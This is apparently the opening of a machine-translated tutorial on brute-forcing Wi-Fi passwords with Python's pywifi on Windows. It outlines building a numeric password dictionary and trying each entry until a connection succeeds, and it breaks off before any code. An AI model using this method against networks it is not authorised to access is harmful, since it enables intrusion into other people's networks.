Introduction Description

The machine operating environment: system environment Win10, the operating environment Python3.6, run the tool Pycharm

Python packages need to have: pywifi

This is a brute wifi mode, the time required is longer, this paper provides a break ideas

Second, the idea of introduction

Mr. into a password dictionary (This step can also be downloaded from the Internet dictionary)

Cycle with each password password dictionary to try to connect Wifi, until success

Third, source design

1. password dictionary TXT file is generated, provided herein is relatively simple, practical crack passwords can be set according to the general, to generate relatively large relatively wide password dictionary

The following provides a simple 8 purely digital dictionary generation program codes
